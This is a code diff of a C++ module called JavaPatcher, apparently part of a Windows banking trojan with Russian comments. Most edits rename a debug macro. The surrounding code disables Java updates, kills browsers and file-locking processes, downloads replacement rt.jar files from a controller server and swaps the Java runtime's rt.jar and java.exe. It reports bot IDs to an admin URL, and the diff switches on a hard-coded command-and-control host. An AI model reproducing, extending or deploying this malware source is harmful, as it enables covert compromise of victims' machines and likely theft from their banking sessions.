@@ -14,7 +14,6 @@
 #include "Utils.h"
 #include "Modules.h"
 #include "JavaConfig.h"
-
 #include "Richedit.h"
 
 
@@ -25,7 +24,7 @@ namespace java_patcher
     #include "DbgTemplates.h"
 }
 
-#define JPDBG  java_patcher::DBGOutMessage<>
+#define DBG  java_patcher::DBGOutMessage<>
 
 struct FILE_CRC32
 {
@@ -64,7 +63,7 @@ static bool GetJavaVersion()
 		char* s = Registry::GetStringValue( HKEY_LOCAL_MACHINE, keyVer, "JavaHome" );
 		m_lstrcpy( javaHome, s );
 		STR::Free(s);
-		JPDBG( "JavaPatcher", "java home: %s", javaHome );
+		DBG( "JavaPatcher", "java home: %s", javaHome );
 
 		char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, "Java6FamilyVersion" );
 		fwsprintfA pwsprintfA = Get_wsprintfA();
@@ -107,8 +106,8 @@ static bool GetJavaVersion()
 									javaCompatible = 3;
 									break;
 							}
-							JPDBG( "JavaPatcher", "java version %d, %d, %d", javaVersion, javaVersion2, javaBuild );
-							JPDBG( "JavaPatcher", "java compatible %d", javaCompatible );
+							DBG( "JavaPatcher", "java version %d, %d, %d", javaVersion, javaVersion2, javaBuild );
+							DBG( "JavaPatcher", "java compatible %d", javaCompatible );
 							res = true;
 						}
 					}
@@ -130,7 +129,7 @@ static bool OffUpdateJava()
 		return false;
 	if( !Registry::SetValueDWORD( HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Update\\Policy", "EnableJavaUpdate", 0 ) )
 		return false;
-	JPDBG( "JavaPatcher", "отключено обновление явы" );
+	DBG( "JavaPatcher", "отключено обновление явы" );
 	return true;
 }
 
@@ -153,11 +152,11 @@ static bool RunCmd( const char* exe, const char* cmd )
 	in.nShow = SW_HIDE;
 	in.lpParameters = cmd;
 
-	JPDBG( "JavaPatcher", "ShellExecuteEx(%s %s) START", exe, cmd );
+	DBG( "JavaPatcher", "ShellExecuteEx(%s %s) START", exe, cmd );
 	bool res = (BOOL)pShellExecuteExA(&in) == TRUE;
 	pWaitForSingleObject(in.hProcess, -1);
 	pTerminateProcess(in.hProcess, 0);
-	JPDBG( "JavaPatcher", "ShellExecuteEx() STOP - %d", (int)res );
+	DBG( "JavaPatcher", "ShellExecuteEx() STOP - %d", (int)res );
 
 	return res;
 }
@@ -203,10 +202,10 @@ static bool UID_To_File(char* BotUid)
 
 static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAddPath, const char* iniFilePath, const char* iniFilePath2, const char* jarExePath, char* libPath )
 {
-	JPDBG( "JavaPatcher", "Unpacking rt_add.jar" );
+	DBG( "JavaPatcher", "Unpacking rt_add.jar" );
 	if( !UnpackToDir( rtAddPath, tmpRtPath, jarExePath ) )
 	{
-		JPDBG( "JavaPatcher", "UnpackToDir rt_add.jar ERROR" );
+		DBG( "JavaPatcher", "UnpackToDir rt_add.jar ERROR" );
 		return false;
 	}
 
@@ -254,12 +253,12 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	DWORD err = (DWORD)pGetLastError();
 	if( !bres && err != ERROR_FILE_EXISTS )
 	{
-		JPDBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rt_.jar, %d", err );
+		DBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rt_.jar, %d", err );
 		return false;
 	}
 	if( pCopyFileA( ".\\lib\\rt.jar", ".\\lib\\rtB.jar", FALSE ) == 0 )
 	{
-		JPDBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rtB.jar" );
+		DBG( "JavaPatcher", "Err: Can`t copy rt.jar -> rtB.jar" );
 		return false;
 	}
 
@@ -267,7 +266,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	pPathAppendA( allUsersProfile, "copy.dat" );
 	File::WriteBufferA( allUsersProfile, 0, 0 );
 
-	JPDBG( "JavaPatcher", "Done!" );
+	DBG( "JavaPatcher", "Done!" );
 
 	return true;
 }
@@ -275,7 +274,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 static char* DownloadPlugin( char *url, DWORD *dwLen, bool crypt )
 {
 	PCHAR data = 0;
-	JPDBG( "JavaPatcher", "DownloadPlugin %s", url );
+	DBG( "JavaPatcher", "DownloadPlugin %s", url );
 	THTTPResponse Response;
 	ClearStruct(Response);
 	HTTP::Get( url, &data, &Response );
@@ -298,7 +297,7 @@ static FILE_CRC32* LoadCorrectCRC32( const char* baseUrl )
 
 	if (!crc32Data)
 	{
-		JPDBG( "JavaPatcher", "LoadCorrectCRC32 DownloadPlugin Failed" );
+		DBG( "JavaPatcher", "LoadCorrectCRC32 DownloadPlugin Failed" );
 		return 0;
 	}
 	else
@@ -366,16 +365,16 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 					res = true;
 				}
 				else
-					JPDBG( "JavaPatcher", "Error saved %s, loaded size (%d) != saved size (%d)", fileName, szData, saved );
+					DBG( "JavaPatcher", "Error saved %s, loaded size (%d) != saved size (%d)", fileName, szData, saved );
 			}
 			else
-				JPDBG( "JavaPatcher", "Error crc32 for %s", url );
+				DBG( "JavaPatcher", "Error crc32 for %s", url );
 			STR::Free(data);
 			break;
 		}
 		else
 		{
-			JPDBG( "JavaPatcher", "Failed Download %s", url );
+			DBG( "JavaPatcher", "Failed Download %s", url );
 			pSleep(3 * 60000); //ждем 3 минуты, и потом снова пытаемся загрузить
 		}
 	}
@@ -388,11 +387,11 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 
 	if( !filesCrc32 )
 	{
-		JPDBG( "JavaPatcher", "Failed Download CRC32" );
+		DBG( "JavaPatcher", "Failed Download CRC32" );
 		return false;
 	};
 
-	JPDBG( "JavaPatcher",  "Start Downloading" );
+	DBG( "JavaPatcher",  "Start Downloading" );
 
 	const char* addUrl = 0;
 	const char* crcName = 0;
@@ -500,7 +499,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, fileName, crcName ) )
 		return false;
 
-	JPDBG( "JavaPatcher",  "Downloading Complete" );
+	DBG( "JavaPatcher",  "Downloading Complete" );
 
 	return true;
 }
@@ -638,7 +637,7 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
  						GetFileName( hFile, Name );
 						StrLowerCase(Name);
 							
-						//JPDBG( "JavaPatcher", "File busy %s", Name );
+						//DBG( "JavaPatcher", "File busy %s", Name );
 						if( Name[0] != 0 && m_strstr( Name, FileName ) != NULL )
 						{
 							*PIDs = (ULONG*)MemRealloc( *PIDs, (procCount + 1) * sizeof(ULONG) );
@@ -669,7 +668,7 @@ void KillAllBrowser()
 			pGetWindowThreadProcessId( wnd, &PID );
 			if( PID )
 				if( KillProcess(PID, 1000) )
-					JPDBG( "JavaPatcher", "kill browser %s", *bb );
+					DBG( "JavaPatcher", "kill browser %s", *bb );
 		}
 		bb++;
 	}
@@ -791,15 +790,18 @@ static PCHAR GetJavaPatcherURL()
 {
 	// Функция возвращает адрес скрипта
 
-//    #ifdef DEBUGCONFIG
-//		return STR::New("http://50.115.122.44/");//"http://94.240.148.127/");//);//rt_jar/");
-//	#endif
+    #ifdef DEBUGCONFIG
+		return STR::New("http://bifitibsystem.org/");//"http://94.240.148.127/");//);//rt_jar/");
+	#endif
 
 	PCHAR URL = NULL;
 	do
 	{
-		URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
-
+		#ifdef JavaConfigH
+			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
+		#else
+			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath); 
+		#endif
 		if (URL == NULL)
         	pSleep(60000);
 	}
@@ -818,7 +820,7 @@ static bool WJFile()
 	
 	if( !File::IsExists(wj) )
 	{
-		JPDBG( "JavaPatcher", "not exist %s", wj );
+		DBG( "JavaPatcher", "not exist %s", wj );
 		if( File::WriteBufferA( wj, NULL, 0 ) == -1 )
 		{
 			pMoveFileExA( wj, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
@@ -829,7 +831,7 @@ static bool WJFile()
 	}
 	else
 	{
-		JPDBG( "JavaPatcher",  "file exist %s", wj );
+		DBG( "JavaPatcher",  "file exist %s", wj );
 		return true;
 	}
 } */
@@ -856,7 +858,7 @@ static void SendLogToAdmin( const char* url, const char* uid, const char* c, con
 	THTTPResponse Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
-	JPDBG( "JavaPatcher", "Отсылка лога: %s", qr );
+	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
 	HTTPResponse::Clear(&Response);
 	STR::Free(qr);
 }
@@ -884,11 +886,11 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	{
 		if( pMoveFileA( srcJava.str(), dstJava.str() ) )
 		{
-			JPDBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
+			DBG( "JavaPatcher", "rename %s -> %s", srcJava.str(), dstJava.str() );
 		}
 		else
 		{
-			JPDBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
+			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
 			pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			ret = false;
@@ -898,7 +900,7 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	{
 		if( pCopyFileA( javaExe, srcJava.str(), FALSE ) )
 		{
-			JPDBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
+			DBG( "JavaPatcher", "copy OK %s -> %s", javaExe, srcJava.str() );
 			pDeleteFileA(javaExe);
 		}
 		else //не удалось скопировать, сделаем это после ребута
@@ -930,7 +932,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	//сообщаем админке, что ява патч запущен
 	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
 
-	JPDBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
+	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
 
 	DWORD userLen = user.size();
 	bool res = false;
@@ -959,7 +961,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				counter++;
 				while( countProcess-- )
 				{
-					JPDBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
+					DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
 					KillProcess( PIDS[countProcess], 1000 );
 				};
 				MemFree(PIDS);
@@ -970,12 +972,12 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
-				JPDBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
+				DBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
 				res = true;
 			}
 			else
 			{
-				JPDBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
+				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
 				pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			}
 			//Подменяем яву
@@ -1036,7 +1038,7 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 
 bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 {
-	JPDBG( "JavaPatcher", "Обновление явы JavaPatch");
+	DBG( "JavaPatcher", "Обновление явы JavaPatch");
 	char fileName[MAX_PATH];
 	
 	GetAllUsersProfile( fileName, sizeof(fileName), JavaPatcherPidsFile);
@@ -1055,7 +1057,7 @@ bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 
 bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
-	JPDBG( "JavaPatcher", "UnPatch Java ");
+	DBG( "JavaPatcher", "UnPatch Java ");
 
 	if( !GetJavaVersion() ) return false;
 
@@ -1129,8 +1131,6 @@ void JavaPatcherAddPidToFile()
 // Функция сигнализирует о необходимости запуска патчей
 void  JavaPatcherSignal()
 {
-	JPDBG( "JavaPatcher", "Создаём сигнальный файл");
-
     JavaPatcherAddPidToFile();
 
 	char SignalFile[MAX_PATH];
